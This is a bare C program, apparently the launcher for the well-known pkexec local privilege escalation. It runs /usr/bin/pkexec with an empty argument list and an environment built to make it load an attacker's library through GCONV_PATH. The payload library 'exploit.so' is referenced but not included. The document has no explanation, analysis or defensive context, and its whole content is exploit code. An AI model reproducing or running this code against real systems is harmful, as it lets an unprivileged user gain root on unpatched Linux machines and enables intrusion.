#include <stddef.h>
#include <stdlib.h>
int main(int argc, char **argv){
	char * const args[] = {NULL};

	char * const env[] = {
		"exploit.so:.",
		"PATH=GCONV_PATH=.",
		"SHELL=/rickroll",
		"CHARSET=EXPLOIT",
		NULL
	};

	execve("/usr/bin/pkexec", args, env);

}
